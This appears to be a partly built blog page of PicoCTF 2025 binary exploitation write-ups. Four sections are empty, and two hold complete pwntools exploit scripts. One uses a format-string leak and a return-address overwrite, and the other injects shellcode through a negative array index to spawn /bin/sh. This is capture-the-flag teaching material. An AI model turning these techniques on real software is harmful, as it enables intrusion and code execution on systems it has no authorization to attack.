---
title: PicoCTF 2025 Binary Exploitation
description: Writeups for PicoCTF 2025 binary exploitation challenges
date: 2025-10-09 14:00:00 -0700
categories: [CTF]
tags: [PicoCTF, Binary Exploitation, Writeup]
---

> This page is a test ground for future format of CTF writeups
{: .prompt-warning }


> This page is under construction
{: .prompt-warning }

## **Pie Time**
---
### Intro
### BreakDown
### Solution
```python
```
<br>
<br>
<br>

## **Pie Time 2**
---
### Intro
### BreakDown
### Solution
```python
```
<br>
<br>
<br>

## **Hash Only 1**
---
### Intro
### BreakDown
### Solution
```python
```
<br>
<br>
<br>

## **Hash Only 2**
---
### Intro
### BreakDown
### Solution
```python
```
<br>
<br>
<br>

## **Echo Valley**
---

### Intro

- **Category**: Format string bug, Return address overwrite
- **Difficulty**: Mid

### Breakdown

Classic echo server format string exploitation.

### Solution Script

```python
#!/usr/bin/env python3

from pwn import *
import time
#from termcolor import colored
#from tqdm import tqdm

elf = ELF("./valley_patched")
rop = ROP(elf)

context.binary = elf
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
"""

def conn():
    if args.REMOTE:
        r = remote("shape-facility.picoctf.net", 51725)
    elif args.GDB:
        gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r

def main():
    r = conn()

    # leak the stack address and base address
    payload_leak = b'%20$p %21$p'
    r.sendlineafter(b'\n', payload_leak)
    r.recvuntil(b'distance: ')

    leak         = r.recvuntil(b'\n', drop=True).split(b' ')
    stack        = int(leak[0],16) - 0x8
    elf.address  = int(leak[1],16) - (elf.sym["main"] + 18)
    win          = elf.sym["print_flag"]
    
    print()
    print(f"stack:  {hex(stack)}")
    print(f"base:   {hex(elf.address)}")
    print(f"win:    {hex(win)}")
    print()

    # payload for editing return address 
    write = {stack : win}
    payload_write = fmtstr_payload(6, write, write_size="short")
    r.sendline(payload_write)
    time.sleep(2)
    r.clean()
    r.sendline(b'exit')
    
    # enjoy the flag
    if args.REMOTE:
        r.recvuntil(b'Here is your flag: ')
        flag = r.recvuntilS(b'}')

        print(flag)
        print()
    else:
        r.recvuntil(b'The Valley Disappears\n')
        msg = r.recvallS()
        print()
        print(msg)
    

if __name__ == "__main__":
    main()
```
<br>
<br>
<br>

## **Handoff**
---

### Intro

- **Category**: Shell scripting, Executable stack, Negative index array
- **Difficulty**: Mid-Hard

### Breakdown

Stack is executable

### Solution

```python
#!/usr/bin/env python3

from pwn import *
#import time
#from termcolor import colored
#from tqdm import tqdm

elf = ELF("./handoff_patched")
rop = ROP(elf)

context.binary = elf
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
b vuln
b *0x4013d0
b *0x4013ac
c
"""

def conn():
    if args.REMOTE:
        r = remote("shape-facility.picoctf.net", 62313)
    elif args.GDB:
        r = gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r


def main():
    r = conn()

    # a random readable writable address for "/bin/sh\0"
    binsh = 0x404048

    # gadget from God
    jmp_rax = 0x4011ae

    # shellcode (I made it only 40 bytes long!)
    #     read(stdin, binsh, 8);
    #     execve(binsh, NULL, NULL);
    shellcode = asm(f"""
                    xor rdi, rdi;
                    mov rsi, {binsh};
                    mov rdx, 8;
                    xor rax, rax;
                    syscall;
                    mov rdi, rsi;
                    xor rsi, rsi;
                    xor rdx, rdx;
                    mov rax, 59;
                    syscall;
                    """)

    # Send a message to a recipient
    r.sendlineafter(b'Exit the app', b'2')

    # negative index bug, unpredictable things will happen if the index is negative
    # fgets will buffer overflow its own stack
    r.sendlineafter(b'send a message to?', b'-1')

    # write shellcode on stack and execute 
    # rax will be pointing at first byte of the payload
    # (the shellcode must be less than or equal to 40 bytes)
    payload = shellcode + p64(jmp_rax)

    # send the payload
    r.sendlineafter(b'like to send them?', payload)

    # SYS_read is invoked. write /bin/sh on 0x404048
    r.sendline(b'/bin/sh\0')

    # SYS_execve is invoked and enjoy the shell privilege
    r.interactive()
    
    

if __name__ == "__main__":
    main()
```
